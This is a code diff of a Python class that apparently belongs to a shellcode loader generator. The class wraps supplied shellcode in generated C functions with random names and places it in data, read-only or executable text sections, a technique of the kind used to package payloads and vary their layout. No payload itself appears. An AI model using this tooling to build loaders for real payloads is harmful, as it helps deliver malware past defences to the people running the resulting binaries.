@@ -6,31 +6,58 @@ class embedded:
 
     def __init__(self, shellcode: str | bytes | list[str], arguments: dict) -> None:
         self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))
-        shellcodeType = type(shellcode).__name__
+        self.type = type(shellcode).__name__
+        self.section = 'rdata'
         if 'section' in arguments:
-            const = not (arguments['section'] == 'data')
+            if arguments['section'] not in ['data', 'rdata', 'text']:
+                print('Section must be either data, rdata, or text')
+                exit(0)
+            self.section = arguments['section']
+            if self.section == 'text':
+                self.shellcode = globals()[f'{type(shellcode).__name__}_to_c'](shellcode, self.name, True)
+            else:
+                self.shellcode = globals()[f'{type(shellcode).__name__}_to_c'](shellcode, 'obfuscated', self.section == 'rdata')
         else:
-            const = True
-        if shellcodeType == "str":
-            self.type = f'{'const' if const else ''} unsigned char *'
-        elif shellcodeType == "bytes":
-            self.type = f'{'const' if const else ''} unsigned char *'
-        elif shellcodeType == "list":
-            self.type = f'{'const' if const else ''} unsigned char **'
-        self.shellcode = globals()[f'{type(shellcode).__name__}_to_c'](shellcode, 'obfuscated', const)
+            self.shellcode = globals()[f'{type(shellcode).__name__}_to_c'](shellcode, 'obfuscated', self.section == 'rdata')
 
     def imports(self) -> list[str]:
         return []
 
     def compilerOptions(self) -> list[str]:
-        return []
+        return ['-Wincompatible-pointer-types']
 
     def transformer(self, shellcodestring: str) -> str:
-        return shellcodestring.format(shellcode=f'{self.name}()')
+        if self.section == 'text':
+            return shellcodestring.format(shellcode=self.name)
+        else:
+            return shellcodestring.format(shellcode=f'(const unsigned char **){self.name}()')
 
     def codeblock(self) -> str:
-        return f"""
-{self.type} {self.name}() {{
+        if self.section == 'text':
+            return f"""
+#pragma section(".text$payload", read, execute)
+{self.shellcode}
+"""
+
+        if self.type == 'bytes':
+            return f"""
+{'const' if self.section == 'rdata' else ''} unsigned char *{self.name}() {{
+    {self.shellcode}
+    return obfuscated;
+}}
+"""
+
+        elif self.type == 'str':
+            return f"""
+{'const' if self.section == 'rdata' else ''} unsigned char * {self.name}() {{
+    {self.shellcode}
+    return obfuscated;
+}}
+"""
+
+        else:
+            return f"""
+{'const' if self.section == 'rdata' else ''} unsigned char ** {self.name}() {{
     {self.shellcode}
     return obfuscated;
 }}
